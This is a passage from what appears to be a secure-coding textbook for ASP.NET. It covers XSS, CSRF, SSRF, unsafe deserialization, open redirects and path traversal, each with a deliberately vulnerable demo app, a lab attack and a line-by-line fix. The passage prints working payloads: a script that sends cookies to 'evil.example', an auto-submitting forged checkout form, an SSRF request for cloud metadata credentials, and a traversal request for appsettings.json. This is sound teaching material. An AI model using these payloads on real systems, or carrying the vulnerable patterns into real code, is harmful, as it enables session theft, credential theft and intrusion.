**Form 4 — Dapper (the micro-ORM you will meet in real codebases):**

```csharp
var products = await connection.QueryAsync<Product>(                  // 1
    "SELECT * FROM Products WHERE Name LIKE @p",                     // 2
    new { p = like });                                               // 3
```

1. Dapper *(a thin mapper over ADO.NET — raw speed, no translation layer)* — the same parameter law, different syntax.
2. The SQL is a **verbatim constant** — the anonymous type supplies the values.
3. `new { p = like }` — property names bind to `@p`. The dangerous Dapper pattern you will find in reviews is the same string-concatenated SQL the 1990s taught — Dapper does not protect you from yourself, it just makes the safe path equally easy.

### 12.7 Defense in Depth (Because Layers Save Lives)

1. **Least-privilege database accounts** — the application's DB user needs `SELECT/INSERT/UPDATE` on business tables; it does **not** need `DROP`, `xp_cmdshell`-equivalents, or schema rights. When injection happens anyway, the blast radius is a *business* problem, not a *server ownership* problem. (This is the one fix that limits even unknown injection paths.)
2. **Close the error channel** — SQL errors go to logs (Ch. 19), never to users: error text is the attacker's oracle.
3. **WAFs help, but are a speed bump** — rule sets catch naive payloads; encoding tricks and zero-day shapes walk through. Never report "we have a WAF" as the fix for injection found in code.

### 12.8 Recap

- One mechanism, every case: user text is *parsed* as query grammar. One fix: parameters — grammar and data travel separately, so the fix is structural, not a filter you apply to input.
- .NET forms: `FromSqlInterpolated`, `FromSqlRaw(sql, parameters)`, LINQ (default), Dapper anonymous-type binding. Grep raw SQL; read `Raw` vs `Interpolated` letter by letter.
- Escalations: UNION extraction, blind (timing/boolean), second-order (stored-then-executed). Errors are reconnaissance; least-privilege DB accounts bound the blast radius.
- You have now *been* the attacker — 27 years of headlines condensed into one afternoon, on your own machine.

**Next:** Chapter 13 moves the execution target from your database to your *users' browsers*: cross-site scripting — planted via a product review, executed as the victim, blocked by the encoding you have quietly relied on since Chapter 4.
## Chapter 13: Cross-Site Scripting (XSS)

> "Your output is someone else's input. Their browser can't tell your code from your data — unless you force it to."

### 13.1 What You Will Learn in This Chapter

XSS (OWASP A03, sibling of SQL injection but targeting *browsers*) is attacker-supplied script executing in your page, under your site's name, in your user's session. You will learn the three species (**reflected**, **stored**, **DOM-based**), how Razor's default encoding defends you (Chapter 4's silent promise, now fully explained), how one `Html.Raw` call deletes that protection, and how the `HttpOnly` cookie flag from Chapter 7 decides what the payload can steal. We plant a stored XSS in SecureShop's new review feature, attack it, then fix it — and add the last layer, Content Security Policy.

### 13.2 History

- **2000** — Microsoft security engineers (CERT advisory CA-2000-02 era) coin **"cross-site scripting"**: one site's content executing in another site's context. The joke of the abbreviation (CSS was taken) stuck: XSS.
- **2005 — the Samy worm:** a single stored XSS on MySpace auto-propagated by adding friends and copying itself into their profiles: **1,000,000+ infected profiles in ~20 hours** — XSS as a self-replicating virus. Nobody's data was sold; Samy wanted fame. The next actors wanted money.
- **2007-2010s** — XSS becomes the most-reported vulnerability class on the web; session-token theft and keylogging payloads become standard. Browsers respond in layers (we add the same layers today): output encoding in frameworks (Razor), `HttpOnly` cookies, **Content-Security-Policy** (CSP, ~2009-2012), and finally Trusted Types (2019+, Google's DOM-XSS mitigation).
- **Today** — modern frameworks are safe *by default*; XSS persists where developers explicitly disable safety ("I need my HTML!", a rich-text field, a legacy `.aspx` page) or build DOM APIs unsafely. Which is precisely the analyst's hunting list.

### 13.3 The Three Species, Word by Word

- **Reflected** — attacker's input comes in the request and is echoed into the response *immediately*: `?q=<script>...` rendered in the search page. Delivered by a crafted link (email, chat). One victim per click.
- **Stored (persistent)** — the payload is *saved* (review, profile bio, order note) and rendered for **every** viewer. Samy-class: no link needed; your own page is the delivery. Worst kind.
- **DOM-based** — no server round trip at all: *page JavaScript* reads attacker-influenced input (`location.hash`, `postMessage`, URL params) and writes it into the DOM with a "code-executing" sink (`innerHTML`, `document.write`, eval). The server never saw the payload; server-side encoding is irrelevant.

And the sentence that organizes everything: **XSS is injection into output, enabled by ambiguity between code and data.** Exactly like SQL injection — different interpreter, same disease, same cure-shape: *make the interpreter unable to confuse data with grammar.*

### 13.4 Razor's Default: The Protection You Didn't Know You Had

Since Chapter 4 you have written `@product.Name` and been safe. Here is why. Razor **HTML-encodes** every `@expression` by default: before the string reaches the browser, `<` becomes `&lt;`, `>` becomes `&gt;`, `"` becomes `&quot;`, `'` becomes `&#39;`, and `&` becomes `&amp;`.

Encoding word by word: those `&lt;` entities are **display text**, not markup — the browser's parser must render them as characters, never treat them as tags. So `product.Name = "<script>alert(1)</script>"` renders as the *visible string* `<script>alert(1)</script>` — a caption, not an execution.

> [LAB] Put `<script>alert(1)</script>` into a product's `Name` via the admin page (Ch. 10). View the store page: harmless text. Then — DevTools → view source — find `&lt;script&gt;`. That transformation is your shield. Memorize its absence: whenever you see the raw `<` on the wire, a hole is open.

### 13.5 Building the Vulnerable Reviews Feature (Stored XSS)

Reviews: text written by users, shown to all — the perfect habitat. Add `Review` to `SecureShop.Core/Models`:

```csharp
public class Review
{
    public int Id { get; set; }
    public int ProductId { get; set; }
    public string Author { get; set; } = string.Empty;
    public string Text { get; set; } = string.Empty;
    public DateTime CreatedAtUtc { get; set; } = DateTime.UtcNow;
}
```

Add `DbSet<Review> Reviews` to `AppDbContext` + `dotnet ef migrations add Reviews && dotnet ef database update`, then a `ReviewsController` with a POST action (antiforgery + ownership of identity via `User.Identity.Name`):

```csharp
[HttpPost]
[ValidateAntiForgeryToken]
[Authorize]
public async Task<IActionResult> Add(Review review)                  // 1
{
    review.Author = User.Identity?.Name ?? "anonymous";
    review.CreatedAtUtc = DateTime.UtcNow;
    _db.Reviews.Add(review);
    await _db.SaveChangesAsync();
    return RedirectToAction("Details", "Products", new { id = review.ProductId });
}
```

1. `Add(Review review)` — binds text; fine for *storage* (encoding is not a storage concern — SQL injection was already prevented by EF Core parameters; storing literal `<script>` is harmless *until output*). XSS is decided at the **view**, so that is where the bug will live. In `Views/Products/Details.cshtml`:

```html
@foreach (var review in Model.Reviews)
{
    <div class="review">
        <strong>@review.Author</strong>
        <p>@Html.Raw(review.Text)</p>        <!-- 1  [VULNERABLE] -->
    </div>
}
```

1. **`Html.Raw(...)***(word-by-word: raw — unprocessed, unencoded)* — the one call that says to Razor: *"trust this string completely; skip encoding."* The developer's usual justification: "we want bold and line breaks in reviews." The result: everything any user types becomes **the page's HTML** — for every visitor.

### 13.6 ATTACK: Stored XSS, and What HttpOnly Just Saved

`[LAB]` Log in, post this review on any product:

```html
Great coffee! <script>
fetch("https://evil.example/collect?c=" + document.cookie + "&p=" + location.href);
</script>
```

Now open the product page as *any* logged-in user: the script executes — in *their* session. `document.cookie` is read by attacker-controlled JavaScript inside your page, and the data exfiltrates to a domain you don't own. The classic theft chain:

```
stored payload → victim's browser executes it as YOUR page
              → reads credentials (cookies, tokens, form inputs — keylogger payloads are a <script> away)
              → POSTs them to attacker infrastructure
```

Now check the exfiltration result (or your server's 404 log on `evil.example`): `document.cookie` returned **only non-HttpOnly cookies** — the `SecureShop.Auth` cookie (Ch. 7's `HttpOnly = true`) was **invisible to the script**. Your XSS still happened (your page still ran enemy code — a finding either way), but the *session-theft shortcut was structurally blocked by a cookie flag you configured six chapters ago*. This is defense in depth paying off, and why analysts audit settings that "do nothing" 99% of days.

### 13.7 The Fix, Line by Line — Layers 1-4

**Layer 1 — default encoding (delete the hole):**

```html
<p>@review.Text</p>                          <!-- 1 -->
```

1. One deletion: reviews render as text, entities and all. `<script>` is now visibly just words. Rule of thumb: **`Html.Raw` on user-influenced data is an automatic finding unless you can show the sanitizer upstream of it.**

**Layer 2 — allow-list sanitization (only if formatting is a hard requirement):**

```csharp
using Ganss.Xss;                                        // dotnet add package HtmlSanitizer
var sanitizer = new HtmlSanitizer();                    // 1
sanitizer.AllowedTags.Add("b"); sanitizer.AllowedTags.Add("i");   // 2
sanitizer.AllowedTags.Add("br"); sanitizer.AllowedTags.Add("p");
var safeHtml = sanitizer.Sanitize(review.Text);         // 3
```

1. `HtmlSanitizer` (the community-standard .NET library) parses HTML and *rebuilds* it from allow-lists.
2. Tags you permit, explicitly. Allow-lists, never deny-lists: a block-list of `<script>` forgets `<img onerror>`, `<svg onload>`, `<iframe>`, `<body onscroll>`...
3. Only the sanitized result may ever reach `Html.Raw`. Sanitization is hard; *not needing it* is better — prefer Markdown (rendered by a safe parser) over raw HTML authoring.

**Layer 3 — DOM hygiene for the client side (DOM-based XSS):**

```javascript
// [VULNERABLE]                       // [FIXED]
el.innerHTML = location.hash;        el.textContent = location.hash;
document.write(q);                    el.textContent = q;
eval(userString);                     JSON.parse(userString);  // or a lookup, never eval
```

`textContent` writes *text* (never parsed as markup); `innerHTML` writes *HTML* (always a code path into the parser). The same word-by-word discipline as Razor: know your **sink's** semantics. (Deep end: enable **Trusted Types** via CSP to make dangerous sinks throw.)

**Layer 4 — Content Security Policy (the last door):** Chapter 18 installs it; know now what it buys: a header telling the browser *"script execution is allowed only from these origins, no inline, no eval"* — so even a smuggled `<script>` (or an `Html.Raw` that slipped past review) hits a browser that refuses to run it. XSS protection you can *declare*, not just hope for.

### 13.8 The Analyst's XSS Review Pattern

1. Grep the sinks: `Html.Raw`, `| raw` (Razor), `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`, `eval`, `new Function`, `setTimeout(string)`.
2. For each hit, trace the data back: does user input (request, database, third-party API, *another user*) reach the sink without encoding or sanitization?
3. Check the context: HTML body vs attribute (`title='@x'` — quote break), vs JavaScript string (encoding is different per context! `@Json.Serialize(x)` for JS contexts), vs URL (`@Url.Content`).
4. Check defense-in-depth flags: `HttpOnly`, CSP, `X-Content-Type-Options` (Ch. 18 — stops browsers sniffing your JSON as HTML).
5. For APIs: responses with attacker-influenced strings + `Content-Type: application/json` are usually safe as JSON — *unless* some endpoint renders them as HTML (export pages, preview features — enumerate every HTML-producing path).

### 13.9 Recap

- XSS = ambiguity between code and data in the browser; species: reflected, stored, DOM-based; stored is the worst (page is the delivery).
- Razor encodes `@expr` by default; `Html.Raw` is the off-switch — an automatic finding on user-influenced paths without a proven sanitizer upstream.
- Fix stack: default encoding → allow-list sanitizer (only if formatting truly required) → DOM sink hygiene (`textContent`) → CSP as the last door; `HttpOnly` caps the blast radius by denying scripts your auth cookie.
- Context matters: body/attribute/JS/URL each need their own encoding — review the *sink*, not just the source.

**Next:** Chapter 14 flips the model entirely: the attacker's site doesn't inject code into *your* page — it makes your user's *browser* attack you, wearing the user's own cookie. CSRF: the request you never made.
## Chapter 14: Cross-Site Request Forgery (CSRF)

> "The site you trust attacks you using the browser that trusts you."

### 14.1 What You Will Learn in This Chapter

CSRF (OWASP's classic A05-adjacent, and the reason `[ValidateAntiForgeryToken]` decorates every POST you have written) is an attack where an *enemy page* makes your user's browser send a request to *your site*, and the browser — faithfully and invisibly — attaches the user's authentication cookie (Chapter 2's law: cookies are auto-attached, no JavaScript required). The server sees a fully authenticated request. The user never made it. You will learn the mechanism, watch it fire against SecureShop from a one-file evil page, then install and dissect the full fix: antiforgery tokens, `SameSite`, and why bearer-token APIs are naturally immune but cookie-based APIs are not.

### 14.2 History

- **2001** — Peter Watkins publishes on Bugtraq what the industry now calls CSRF; earlier academic work had sketched the idea, but now it has a name and a proof. For years it is treated as a curiosity: "so the browser sends my cookie... what can that do?"
- **2008** — maturity of the attack era: documented CSRF against Gmail's contact import (a hostile site could silently harvest your address book) and multiple banking transfer abuses; regulators start reading.
- **2010s** — the defense standardizes: **synchronizer token pattern** (per-session token in every form; checked server-side) becomes the framework default everywhere — including ASP.NET MVC. Later, **SameSite cookies** (Chrome default 2019-2020) add a structural layer: browsers stop attaching cookies to most cross-site requests at all.
- **Today** — CSRF is *solved* in modern stacks — it is on auto-pilot while it remains wide open in legacy pages, "one custom endpoint", and cookie-authenticated SPAs. Perfect analyst territory: the finding lives where people stopped paying attention.

### 14.3 The Mechanism, Step by Step

The three preconditions, all true by default in a cookie-authenticated MVC app:

1. Your user is logged in to `secure-shop` → their browser holds a valid session cookie (Ch. 7).
2. Your state-changing endpoints authenticate **by cookie alone** — a plain form POST, no per-request secret: `POST /Cart/Checkout` with the cookie = confirmed order.
3. The user can be lured to *any other* page — an ad, a forum post, an email link — `evil.example`.

The evil page (Chapter 2 gave you every skill to read it):

```html
<!-- evil.example/innocent-looking-blog-post.html -->
<form id="f" action="https://localhost:7101/Cart/Checkout" method="POST">
    <input type="hidden" name="productId" value="1">
    <input type="hidden" name="quantity" value="99">
    <input type="hidden" name="shipTo" value="Attacker's address">
</form>
<script>f.submit();</script>          <!-- fires on page load; the user never sees a form -->
```

What the victim experiences: they click a link, a page loads, maybe nothing happens. What the browser does: sends `POST /Cart/Checkout` to your site **with their cookie attached** — that is what cookies do, on *any* request to your domain, from *any* page. What the server sees: a perfectly authenticated checkout for 99 bags of coffee shipped to an attacker's address. [ANALYST LENS] and the sentence that decides the finding: *"the request carried the user's authority, but not the user's intent."*

Why CORS doesn't save you: browsers block *reading cross-origin responses*, but this attack never needs to read the response — the damage is in the **request**. Forms are "simple requests" by spec; no preflight is sent; CORS is irrelevant to classic CSRF. (Memorize; it corrects a very common developer misunderstanding.)

### 14.4 [VULNERABLE] The Unguarded Checkout

SecureShop already carries the fix by habit (every `[HttpPost]` you wrote since Chapter 6 had `[ValidateAntiForgeryToken]`). For the demo, build the endpoint *without* it — in `CartController`:

```csharp
public class CartController : Controller
{
    [HttpPost]
    public IActionResult Checkout(int productId, int quantity, string shipTo)   // 1
    {
        // ... create the order, decrement stock, redirect to "Thanks" page
        return RedirectToAction("Thanks");
    }
}
```

1. Fully authenticated by the cookie (the site wouldn't ship otherwise), **zero per-request secret** — the entire CSRF contract is fulfilled. Note it's not even an *input* problem: every parameter is valid; the request is *well-formed*. CSRF is a pure **intent** problem, which is why no amount of input validation touches it.

`[LAB]` Save the evil form (§ 14.3) as a local file, serve it any way you like (`python3 -m http.server 9999` in a folder, then browse to `http://localhost:9999/evil.html`), while logged in to SecureShop in the same browser. Watch the order appear. Then look at DevTools → Network: the POST, your cookie, `200`. Clean, quiet, malicious.

### 14.5 The Fix, Line by Line — Layer 1: The Synchronizer Token

```csharp
[HttpPost]
[ValidateAntiForgeryToken]                    // 1
public IActionResult Checkout(int productId, int quantity, string shipTo)
{
    ...
}
```

1. The filter demands a **per-request token pair**: (a) an `AntiForgeryToken` **cookie** the server set (random, not readable by JS thanks to `HttpOnly` on it), and (b) a **hidden form field** whose value must match the cookie's secret under a keyed derivation. The evil site (§ 14.3) can *cause* the browser to send (a) — cookies are automatic — but cannot *read or compute* (b): same-origin policy forbids `evil.example` from reading SecureShop pages' DOM or setting a correct field value. Without the pair, the filter short-circuits the request with `400`.

Where the field comes from — you already wrote it: the Razor `<form method="post" ...>` tag helper auto-injects:

```html
<form method="post" asp-controller="Cart" asp-action="Checkout">
    <input name="__RequestVerificationToken" type="hidden"
           value="CfDJ8N....876-page-and-session-specific-token....">   <!-- 1 -->
```

1. View source and find it — *now*; every Razor POST form you've written since Chapter 6 has been carrying a CSRF shield you can verify byte-by-byte.

The right default at scale — protect an app by **policy** instead of memory:

```csharp
builder.Services.AddControllersWithViews(options =>
{
    options.Filters.Add(new AutoValidateAntiforgeryTokenAttribute());  // 1
});
```

1. `AutoValidateAntiforgeryToken` applies the check to **every unsafe method (POST/PUT/PATCH/DELETE)** in MVC, skipping safe GETs. Opt-outs become explicit and greppable: `[IgnoreAntiforgeryToken]` — [ANALYST LENS] every single `IgnoreAntiforgeryToken` in a codebase is a review item with a required justification comment. (A better global pair: validate-unsafe + `[ValidateAntiForgeryToken]` on the remaining cases.)

### 14.6 The Fix — Layer 2: SameSite (Structural, from Chapter 7)

`options.Cookie.SameSite = SameSiteMode.Lax` (Ch. 7) already refused to attach the auth cookie to the evil page's cross-site POST (form POSTs are not top-level safe navigations). Run the lab again — even the *token-less* vulnerable endpoint now fails, because the request arrives anonymous. Two independent shields:

| Layer | Stops | Bypassed by |
|---|---|---|
| Antiforgery token | Cross-site forms, XHR posts | Subdomain XSS (token readable in-domain); ancient browsers |
| `SameSite=Lax/Strict` | All non-navigation cross-site sends | Top-level GET navigations under Lax (GET must never mutate — Ch. 2's rule); old browsers; `SameSite=None` configs |

Hence the rules that look like pedantry and are not: **GET must never change state** (Lax still attaches to top-level GET navigations — your "logout via link" and "unsubscribe via email link" must carry a confirmation page or token); `SameSite=None` is only for documented cross-site embedding; **both layers always**, because each fails in a way the other covers.

### 14.7 CSRF and APIs: The Chapter 8 Payoff

Bearer tokens are **not cookies**: `Authorization: Bearer ...` is a header an evil page cannot cause a browser to attach (no auto-attach machinery, no cross-site form can set headers). The token-based `SecureShop.Api` is therefore *structurally* immune to classic CSRF — this is the quiet security dividend of JWT, the one cookie authentication cannot match.

The catch — modern SPAs frequently put **cookies back on the API** ("credential: include" + cookie-based API auth, e.g. auth-scheme-as-a-service patterns): at that instant, every API endpoint with side effects is a CSRF surface again, and needs antiforgery (the `IAntiforgery` service can mint a token pair for AJAX: cookie + header, checked via `auto.Validate` middleware or `ValidateRequestAsync`). The analyst's one-line triage for any API: **"cookie or token?"** — cookie ⇒ require CSRF tokens on unsafe verbs; token ⇒ verify `SameSite`/`HttpOnly`/storage story (Ch. 8 § 8.10) instead.

### 14.8 [ANALYST LENS] The CSRF Review Checklist

- Every non-GET route (MVC and any cookie-authenticated API): `[ValidateAntiForgeryToken]` / auto-validate middleware — and every `IgnoreAntiforgeryToken` carries a written justification.
- Auth cookies: `SameSite` set (Lax/Strict; any `None` documented); `Secure`; `HttpOnly`.
- No state changes on GET — grep for redirecting GET actions that also write (`[HttpGet] ... Delete(` is the classic).
- Login CSRF edge case (attacker logs the victim into the *attacker's* account via forged login POST — real, subtle, and fixed by antiforgery on login forms too; ASP.NET Core's templates include it — verify).
- Logout CSRF (one-link logout) — prefer POST + token, or accept logout-CSRF as documented low risk.

### 14.9 Recap

- CSRF = the user's authority without the user's intent; enabled by cookie auto-attach; invisible to CORS; input validation is irrelevant.
- Fix = per-request tokens (synchronizer pattern: cookie + form/header pair, auto-validate by default) + `SameSite` + never-mutating GETs. Both layers, always.
- Bearer APIs: structurally immune; cookie APIs: re-attackable — triage with one question ("cookie or token?").
- The habit you have been building since Chapter 6 — `[ValidateAntiForgeryToken]` on every POST — was never ceremony. You now know exactly what it was.

**Next:** Chapter 15 runs a four-piece medley of the "less famous but brutal" OWASP classes: SSRF (your server fetches attacker URLs), unsafe deserialization (objects from strangers), open redirects (phishing with your domain), and path traversal (../../ into your secrets).
## Chapter 15: SSRF, Unsafe Deserialization, Open Redirects, and Path Traversal

> "Four bugs that don't inject code into anyone's page — and own you anyway."

### 15.1 What You Will Learn in This Chapter

Four smaller OWASP classes, each famous in real breaches, each a five-line bug and a five-line fix — *once you can see them*. For each: mechanism, a vulnerable SecureShop feature, the attack, the fix, line by line, and the analyst's grep. Fast-paced chapter; everything here reappears in the STRIDE model (Ch. 20) and the review pack (Ch. 21).

### 15.2 SSRF — Server-Side Request Forgery (OWASP A10)

**History.** SSRF went from "oddity" to headline with **Capital One (2019)**: a crafted request to a misconfigured firewall let an attacker reach the cloud **metadata service** (`169.254.169.254`), which handed over credentials that unlocked ~100M customer records. The lesson generalized: *anywhere a server fetches a URL, that URL is a door to the server's own network.*

**Mechanism.** Your server can reach things the attacker cannot: internal APIs, admin panels on localhost, cloud metadata endpoints, databases' HTTP interfaces. If your code fetches *attacker-supplied* URLs with *the server's privileges*, you have become the attacker's proxy into the trusted zone — the word **forgery** *(the server's request, forged for someone else's purpose)* is exact.

**[VULNERABLE] The "import product image from URL" feature** (API):

```csharp
public record ImportImageRequest(string Url);                      // 1

[HttpPost("products/{id:int}/image-from-url")]
[Authorize(Roles = "admin")]
public async Task<IActionResult> ImportFromUrl(int id, ImportImageRequest request)
{
    var bytes = await _httpClient.GetByteArrayAsync(request.Url);   // 2
    // ...save bytes as the product image
    return Ok();
}
```

1. A JSON body with a URL — admin-only UI offers "paste an image URL".
2. `_httpClient` — a `HttpClient` registered in DI, running **with the server's network privileges**. Whatever URL arrives is fetched from inside the trust boundary.

**[ATTACK]** With a stolen admin token (Ch. 13's XSS? Ch. 8's localStorage theft?) — or an insider, or a compromised admin account — the attacker posts:

```json
{ "Url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
```

(cloud metadata — hands out the server's own IAM credentials), or `http://localhost:5101/...` (internal services that "aren't exposed"), or `http://10.0.0.5:6379/...` (your internal Redis). Even without cloud metadata in your lab: point it at your own MVC app's admin URL and you've proven the server can be made to reach trusted-zone targets.

**[FIXED] Line by line — allow-list plus scheme guard:**

```csharp
private static readonly HashSet<string> AllowedHosts =
    new(StringComparer.OrdinalIgnoreCase)                          // 1
    { "images.supplier-partner.example" };

private static bool IsAllowedFetchUrl(string url, out Uri uri)
{
    if (!Uri.TryCreate(url, UriKind.Absolute, out uri!))            // 2
        return false;
    if (uri.Scheme is not ("http" or "https"))                      // 3
        return false;
    if (!AllowedHosts.Contains(uri.Host))                           // 4
        return false;
    return true;
}

[HttpPost("products/{id:int}/image-from-url")]
[Authorize(Roles = "admin")]
public async Task<IActionResult> ImportFromUrl(int id, ImportImageRequest request)
{
    if (!IsAllowedFetchUrl(request.Url, out var uri))              // 5
        return BadRequest(new { error = "URL host is not on the allow-list." });

    _httpClient.Timeout = TimeSpan.FromSeconds(10);                // 6
    var bytes = await _httpClient.GetByteArrayAsync(uri);
    // ... save
}
```

1. **Host allow-list** — the only sustainable control: enumerate the partner hosts you actually fetch from. (IP-range block-lists are the weaker cousin: cloud ranges move, and IPv6 keeps growing.)
2. Parse *before* use — a malformed URL must fail closed.
3. Scheme guard: kills `file://` (reading local files via HttpClient-adjacent stacks) and `gopher://`-style oddities in one pattern.
4. The allow-list check — the heart. Note what it does *not* trust: the URL string, ever.
5. The check runs even though the endpoint is admin-protected — SSRF's whole point is that *trusted users become proxies*; role checks do not neutralize a compromised account.
6. Timeouts bound resource-exhaustion variants (fetch a 10GB file = a slow DoS).

Residual risk, one paragraph: even allow-listed hosts can be DNS-rebound or hijacked, so hardened deployments add **resolve-then-connect** (validate the resolved IPs against public ranges right before connecting), redirect handling disabled (`AllowAutoRedirect = false` — a 302 from an allowed host to `169.254.169.254` re-opens the door), and network-level egress filters. Know the words; the analyst's job is to detect the *absence of a policy at all*.

**[ANALYST LENS]** grep: `GetByteArrayAsync|GetStringAsync|GetFromJsonAsync|SendAsync|WebClient|HttpWebRequest` → for each: where does the URL come from? Request body/param ⇒ SSRF surface; config ⇒ fine.

### 15.3 Unsafe Deserialization (OWASP A08)

**History.** Deserialization bugs are old (they powered the Java-era "gadget chain" era of ~2011-2017, e.g., the Apache Commons-era exploitation wave), reached .NET consciousness via `ViewState` attacks on legacy Web Forms, and became a Top-10 category when attackers realized: **a serialized object, when reconstructed, can trigger code via any logic that runs during construction.** In .NET's own history, `BinaryFormatter` — the default binary serializer since .NET Framework 1.0 (2002) — was revealed to be structurally unsafe for untrusted input (Microsoft Security Advisory in 2017 era, then a series of CVEs). Microsoft's own guidance escalated from "don't use it on untrusted input" (2017) to "it's dangerous" (.NET 5-8: disabled by default, throws `PlatformNotSupportedException` unless the compatibility switch `EnableUnsafeBinaryFormatterSerialization` re-enables it) to **removed entirely in .NET 9**. An entire built-in API, deprecated to death.

**Mechanism.** Deserialization *(word-by-word: de-serialize — rebuild a live object from a byte/text representation)* reconstructs *types*, not just data. If the wire format can name types (or trigger side effects while reconstructing), the attacker isn't sending your app data anymore — they're sending it *behavior*: type-confusion and gadget chains that end in file writes or command execution. JSON looks harmless — the danger arrives when the *type* is data-driven: Newtonsoft's `TypeNameHandling.Auto`/`All` honors `"$type": "System.Diagnostics.Process, ..."` in the input: instantiating attacker-chosen types from attacker-supplied names.

**[VULNERABLE]** The "legacy import format" — both real-world patterns you'll find in audits:

```csharp
// Pattern A: the binary legacy relic (throws on modern .NET unless compatibility switch is on)
var format = new BinaryFormatter();                      // 1
var basket = (LegacyBasket)format.Deserialize(stream);   // 2

// Pattern B: the JSON config that trusts the wire's type names
public class JsonSettings : JsonSerializerSettings
{
    public JsonSettings() => TypeNameHandling = TypeNameHandling.Auto;   // 3
}
```

1-2. `BinaryFormatter.Deserialize` — 20 years of "works on my machine" then a Critical CVE bulletin: the byte stream names types; *any* serializable type with dangerous behavior (gadget types in the framework or your own assemblies) can be coerced into the graph. On .NET 8 this line throws by default — which converts a critical vulnerability into a support ticket; the fix is not the switch, it is *a new format*.
3. `TypeNameHandling.Auto` in Newtonsoft.Json — silently enables polymorphic deserialization: input can carry `$type`; the deserializer resolves and instantiates it. Microsoft's own guidance is blunt: **never use `TypeNameHandling` with untrusted input** (CVE-2024-XXX-class gadget findings keep confirming it).

**[FIXED]**

```csharp
// 1. New format, no type names on the wire:
var basket = System.Text.Json.JsonSerializer
    .Deserialize<LegacyBasket>(json)!;                    // 1

// 2. If polymorphism is genuinely needed (.NET 7+): declare the closed set:
[JsonDerivedType(typeof(LegacyBasket), "basket")]
[JsonDerivedType(typeof(LegacyCoupon), "coupon")]
public abstract class ImportNode { ... }                  // 2
```

1. `System.Text.Json` never honors type names from the wire by default — the *declared target type* is the contract. Data arrives as a value, never as a type.
2. When you truly need variants, allow-list them at compile time: `JsonDerivedType` maps a *string discriminator* to a *known* type; the attacker may choose among the types you declared — which is a decision, not a capability.

**[ANALYST LENS]** grep: `BinaryFormatter|SoapFormatter|NetDataContractSerializer|TypeNameHandling|LosFormatter|ObjectStateFormatter|JavaScriptSerializer` — each is an auto-finding on an input path; then verify what deserializes *where* (upload endpoints, message queues, cache layers, IPC — not just HTTP bodies).

### 15.4 Open Redirects

**Mechanism.** A redirect whose destination is user-supplied: `https://secure-shop.example/Account/Logout?returnUrl=https://secure-shop.example.attacker.io/login` — the user *reads* your domain in the link; the browser ends on a pixel-perfect copy of your login page. Phishing's force multiplier is your own reputation. (OWASP classifies under A01/A05-adjacent; regulators have cited it for credential-theft chains.)

**[VULNERABLE]**

```csharp
public IActionResult Logout(string returnUrl)
    => Redirect(returnUrl);                               // 1
```

1. `Redirect(url)` — 302 to any absolute URL, including cross-origin. A logout page (or login page) is the favorite: the victim lands, confused, on a fake login.

**[FIXED]** — two layers, both one line:

```csharp
public IActionResult Logout(string? returnUrl)
{
    if (!string.IsNullOrWhiteSpace(returnUrl) && Url.IsLocalUrl(returnUrl))   // 1
        return Redirect(returnUrl);

    return RedirectToAction("Index", "Home");             // 2
}
```

1. `Url.IsLocalUrl` — the framework's allow-list in a function: accepts only local paths (`/`, `~/`), rejects absolute URLs, protocol-relative (`//evil`), and scheme tricks. You have already used the *other* hardened form — `LocalRedirect` throws on non-local URLs (Ch. 6) — this pair (`IsLocalUrl` / `LocalRedirect`) is the review answer for every `returnUrl`/`redirect` parameter.
2. Fallback to a fixed safe route — fail closed, never "redirect anyway".

**[ANALYST LENS]** grep: `Redirect(.*Request|Redirect(.*Parameter|returnUrl|redirect_uri` (the OAuth variant from Ch. 9) — each user-controlled destination must show an `IsLocalUrl`/registration-match guard; test payloads: `https://evil`, `//evil`, `\evil`, `javascript:` (should all die).

### 15.5 Path Traversal

**Mechanism.** File paths built from user input: `"../../"` *(word-by-word: parent-directory — a relative path operator that walks **up** out of the folder you intended)*. The 1988-era bug (it predates the web; FTP and CGI were mass-issuing it) that leaks `/etc/passwd` in Linux stacks and, on .NET, most deliciously: **`appsettings.json`, `secureshop.db`, and source files** — your entire Part V secrets chapter, stolen through a download link.

**[VULNERABLE] The invoice download** (MVC):

```csharp
[HttpGet]
public IActionResult DownloadInvoice(string file)
{
    var path = Path.Combine(_env.WebRootPath, "invoices", file);    // 1
    return PhysicalFile(path, "application/octet-stream");          // 2
}
```

1. `Path.Combine(root, userFile)` — *looks* contained, but `file = "..\\..\\appsettings.json"` combines upward: Combine is obedient, not safe.
2. `PhysicalFile(path, ...)` — serves whatever resolved path exists.

**[ATTACK]** `GET /Home/DownloadInvoice?file=..%2F..%2Fappsettings.json` — two hops above `wwwroot/invoices` lands in the project root: your connection strings, your JWT key placeholder, your SMTP credentials, downloaded by anyone. (Also legal: `secureshop.db` — the entire identity database, one request.)

**[FIXED] Line by line:**

```csharp
[HttpGet]
public IActionResult DownloadInvoice(string file)
{
    var root = Path.Combine(_env.WebRootPath, "invoices");             // 1
    var fullPath = Path.GetFullPath(Path.Combine(root, file));         // 2

    if (!fullPath.StartsWith(root + Path.DirectorySeparatorChar,       // 3
                             StringComparison.OrdinalIgnoreCase))
        return NotFound();

    if (!System.IO.File.Exists(fullPath))
        return NotFound();

    return PhysicalFile(fullPath, "application/pdf",                   // 4
        fileDownloadName: Path.GetFileName(fullPath));
}
```

1. The **canonical root** — computed from server config (`IWebHostEnvironment`), never from input.
2. `Path.GetFullPath` — resolves *all* `..`/`.`/symlink tricks into an absolute, canonical path: the attack text now shows its true destination.
3. **The containment check** — the one line that is the fix: the canonical result must still begin with the canonical root *plus a separator* (the `+` avoids the `...invoices-evil` prefix-collision bug — containment bugs via string prefix are their own finding family).
4. Explicit content type and download name — sets `Content-Disposition: attachment`, so even a smuggled `.html` invoice can't execute in your origin (Ch. 13 defense, at the file layer). Stronger pattern for real systems: **store files under random names** (Ch. 16) and never let user text pick a disk path at all — a name→record lookup (fetch invoice *by its database ID*) removes the class entirely.

**[ANALYST LENS]** grep: `Path.Combine|File.Open|File.Read|FileStream|PhysicalFile` — for each, trace the last segment's origin; request/query/form ⇒ finding unless the `GetFullPath` containment pattern (or an ID lookup) is present.

### 15.6 Recap

- SSRF: server fetches attacker URLs with server privileges — allow-list hosts, guard schemes, bound redirects; your server is always in the attacker's reach, not vice versa.
- Unsafe deserialization: type names on the wire are code execution candidates — `BinaryFormatter` died of this; `TypeNameHandling` is the JSON cousin; `System.Text.Json` + closed polymorphism is the fix.
- Open redirects: phishing with your domain — `IsLocalUrl`/`LocalRedirect` on every user-controlled destination.
